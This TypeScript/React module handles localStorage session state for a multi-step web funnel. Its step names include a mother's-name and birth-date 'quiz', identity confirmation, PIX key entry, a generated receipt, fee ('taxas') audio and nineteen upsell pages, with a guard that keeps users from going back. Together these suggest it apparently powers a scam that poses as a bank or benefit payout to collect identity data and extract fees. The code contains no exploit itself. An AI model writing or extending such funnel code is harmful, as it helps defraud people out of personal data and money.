import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CPFData } from "@/lib/cpf";

const SESSION_KEY = "bb_session";

export type ChatStep = "waiting-video" | "greeting" | "quiz-mae" | "quiz-nascimento" | "identity-confirmed" | "audio-3-validation" | "waiting-confirm-validation" | "show-approval-animation" | "pix-type-selection" | "pix-cpf-input" | "pix-email-input" | "pix-confirm" | "audio-2-comprovante" | "generating-comprovante" | "envio-selection" | "sms-input" | "email-input" | "audio-1-taxas" | "taxa-info" | "processing" | "final";

export interface ChatState {
  chatStep: ChatStep;
  chatAudioListened: string[];
  chatPixType: "telefone" | "cpf" | "email" | null;
  chatPixKey: string;
  chatVideoWatched: boolean;
}

export interface CepData {
  cep: string;
  logradouro: string;
  bairro: string;
  localidade: string;
  uf: string;
}

export interface AgencyData {
  name: string;
  endereco: string;
  cidade?: string;
  distanceKm?: number;
}

interface SessionData {
  cpfData: CPFData;
  currentStep: string;
  valorBeneficio?: number;
  protocolo?: string;
  timestamp: number;
  chatState?: ChatState;
  cepData?: CepData;
  agencyData?: AgencyData;
}

const FUNNEL_STEPS = [
  "/",
  "/resultado",
  "/inscricao",
  "/confirma-dados",
  "/detalhes-inscricao",
  "/pagamento",
  "/upsell-info/1", "/upsell/1",
  "/upsell-info/2", "/upsell/2",
  "/upsell-info/3", "/upsell/3",
  "/upsell-info/4", "/upsell/4",
  "/upsell-info/5", "/upsell/5",
  "/upsell-info/6", "/upsell/6",
  "/upsell-info/7", "/upsell/7",
  "/upsell-info/8", "/upsell/8",
  "/upsell-info/9", "/upsell/9",
  "/upsell-info/10", "/upsell/10",
  "/upsell-info/11", "/upsell/11",
  "/upsell-info/12", "/upsell/12",
  "/upsell-info/13", "/upsell/13",
  "/upsell-info/14", "/upsell/14",
  "/upsell-info/15", "/upsell/15",
  "/upsell-info/16", "/upsell/16",
  "/upsell-info/17", "/upsell/17",
  "/upsell-info/18", "/upsell/18",
  "/upsell-info/19", "/upsell/19",
];

const getStepIndex = (path: string): number => {
  const index = FUNNEL_STEPS.indexOf(path);
  return index === -1 ? 0 : index;
};

export const saveSession = (data: Partial<SessionData> & { cpfData: CPFData; currentStep: string }) => {
  const existingSession = getSession();
  const sessionData: SessionData = { ...existingSession, ...data, timestamp: Date.now() };
  localStorage.setItem(SESSION_KEY, JSON.stringify(sessionData));
};

export const saveChatState = (chatState: ChatState) => {
  const existingSession = getSession();
  if (!existingSession) return;
  const sessionData: SessionData = { ...existingSession, chatState, timestamp: Date.now() };
  localStorage.setItem(SESSION_KEY, JSON.stringify(sessionData));
};

export const getChatState = (): ChatState | null => {
  const session = getSession();
  return session?.chatState || null;
};

export const getSession = (): SessionData | null => {
  try {
    const data = localStorage.getItem(SESSION_KEY);
    if (!data) return null;
    const session: SessionData = JSON.parse(data);
    const expireTime = 24 * 60 * 60 * 1000;
    if (Date.now() - session.timestamp > expireTime) { clearSession(); return null; }
    return session;
  } catch { return null; }
};

export const clearSession = () => { localStorage.removeItem(SESSION_KEY); };

export const useSessionRestore = () => {
  const navigate = useNavigate();
  const location = useLocation();
  useEffect(() => {
    const session = getSession();
    if (location.pathname === "/" && session?.cpfData && session?.currentStep) {
      const savedStepIndex = getStepIndex(session.currentStep);
      if (savedStepIndex > 0) {
        navigate(session.currentStep, { state: { cpfData: session.cpfData, valorBeneficio: session.valorBeneficio, protocolo: session.protocolo }, replace: true });
      }
    }
  }, [location.pathname, navigate]);
};

export const useFunnelGuard = (currentPath: string) => {
  const navigate = useNavigate();
  useEffect(() => {
    const session = getSession();
    if (!session?.cpfData || !session?.currentStep) return;
    const savedIndex = getStepIndex(session.currentStep);
    const currentIndex = getStepIndex(currentPath);
    if (savedIndex > currentIndex) {
      navigate(session.currentStep, {
        state: { cpfData: session.cpfData, valorBeneficio: session.valorBeneficio, protocolo: session.protocolo },
        replace: true,
      });
    }
  }, [currentPath, navigate]);
};

export const useSaveStep = (currentStep: string, cpfData?: CPFData, extraData?: { valorBeneficio?: number; protocolo?: string }) => {
  useEffect(() => {
    if (cpfData) { saveSession({ cpfData, currentStep, ...extraData }); }
  }, [currentStep, cpfData, extraData?.valorBeneficio, extraData?.protocolo]);
};
